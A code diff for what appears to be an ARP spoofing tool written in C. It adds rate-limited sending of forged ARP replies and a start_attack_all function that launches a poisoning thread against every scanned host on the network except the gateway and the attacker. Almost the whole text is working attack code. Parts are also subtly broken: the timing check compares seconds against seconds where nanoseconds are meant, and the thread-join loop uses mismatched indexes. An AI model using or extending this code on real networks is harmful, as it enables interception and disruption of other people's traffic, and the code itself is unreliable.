@@ -12,6 +12,7 @@
 #include <netdb.h>
 #include <linux/if_arp.h>
 #include <pthread.h>
+#include <time.h>
 
 # include "struct.h"
 # include "define.h"
@@ -53,6 +54,8 @@ static void *arpthread(void *argp)
 	const struct arguments *arguments = arg->arguments;
 	nmap_r *target = arg->target;
 	SOCKET iface = arg->iface;
+	struct timespec start = {0x0}, stop = { 0x0 };
+	float time_to_wait = ((60 / arguments->ppm) * 1000000);
 
 	unsigned char payload[42] = { 0x0 };
 	eth *eth_hdr = (eth*)payload;
@@ -85,16 +88,71 @@ static void *arpthread(void *argp)
 
 	TELLNUKINGTARGET(target->pa, arguments->gateway_pa, arguments->self_ha);
 
+	// not initialiszing the structure allow us to send a reply packet the 1st time we enter the loop
 	while (g_stop == 1) {
-		rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfo, sizeof(ifaceinfo));
-
-		if (rlen != ETH_HLEN + ARP_HLEN)
-			{ ERROR_SEND(); goto err; }
-		sleep(0.2); // need to match ppm in arg structure
+		clock_gettime(CLOCK_REALTIME, &stop);
+		if ((stop.tv_sec - start.tv_sec) * 1000000 + (stop.tv_sec - start.tv_sec) > time_to_wait)
+		{
+			rlen = sendto(iface, payload, ETH_HLEN + ARP_HLEN, 0, (struct sockaddr*)&ifaceinfo, sizeof(ifaceinfo));
+			if (rlen != ETH_HLEN + ARP_HLEN)
+				{ ERROR_SEND(); goto err; }
+			clock_gettime(CLOCK_REALTIME, &start);
+		}
+		sleep(0.05);
 	}
 	return NULL;
 err:
 	return NULL;
+}
+
+int start_attack_all(const struct arguments *arguments, nmap_r **scan)
+{
+	SOCKET iface = -1;
+	pthread_t *thread = NULL;
+	struct arpthreadinfo **argp;
+
+	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
+		goto err;
+	TELLSOCKETSUCCESS(arguments->ifacename);
+
+	/* malloc each thread and its arguments */
+	if (!(thread = malloc((arguments->scanamount - 2) * sizeof(thread))))
+		{ ERROR_MALLOC(); goto err; }
+	if (!(argp = malloc((arguments->scanamount - 2) * sizeof(arpthreadinfo*))))
+		{ ERROR_MALLOC(); goto err; }
+	start_signal();
+
+	/* setup thread arguments and start it if its not the gateway or us */
+	for (size_t i = 0, j = 0; scan[i] != NULL; ++i) {
+		if (scan[i]->gateway == 0 && scan[i]->self == 0) {
+			if (!(argp[j] = malloc(sizeof(arpthreadinfo))))
+				{ ERROR_MALLOC(); goto err; }
+			argp[j]->iface = iface;
+			argp[j]->arguments = arguments;
+			argp[j]->target = scan[i];
+			pthread_create(&thread[j], NULL, arpthread, argp[j]);
+			++j;
+		}
+	}
+	/* wait for thread to finish */
+	for (size_t j = 0; j < arguments->scanamount - 2; ++j) {
+		if (scan[j]->gateway == 0 && scan[j]->self == 0)
+			pthread_join(thread[j], NULL);
+		free(argp[j]);
+	}
+	stop_signal();
+	g_stop = 1;
+	free(thread);
+	free(argp);
+
+	TELLSTOPATTACK();
+
+	close(iface);
+	return 0;
+err:
+	if (iface != -1)
+		close(iface);
+	return -1;
 }
 
 int start_attack_one(const struct arguments *arguments, nmap_r *target)
@@ -102,7 +160,6 @@ int start_attack_one(const struct arguments *arguments, nmap_r *target)
 	SOCKET iface = -1;
 	pthread_t thread;
 	struct arpthreadinfo argp;
-
 
 	if ((iface = initiate_socket_for_arp(arguments->ifacename)) == -1)
 		goto err;
